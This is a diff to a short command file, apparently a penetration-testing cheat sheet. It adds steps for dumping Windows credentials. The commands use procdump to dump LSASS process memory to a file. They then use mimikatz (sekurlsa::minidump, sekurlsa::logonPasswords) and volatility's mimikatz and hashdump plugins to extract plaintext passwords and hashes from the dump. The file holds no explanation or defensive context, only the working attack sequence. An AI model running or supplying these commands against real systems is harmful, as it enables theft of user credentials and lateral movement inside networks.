@@ -1,2 +1,8 @@
 procdump.exe -accepteula -ma lsass.exe C:\Support\lsass.dmp 2>&1
+(or)
+procdump.exe -accepteula -64 -ma lsass.exe C:\Support\lsass.dmp 2>&1
+
 mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
+
+volatility --plugins=/usr/share/volatility/plugins --profile=Win7SP0x86 -f lsass.dmp mimikatz
+volatility --plugins=/usr/share/volatility/plugins --profile=Win7SP0x86 -f lsass.dmp  hashdump
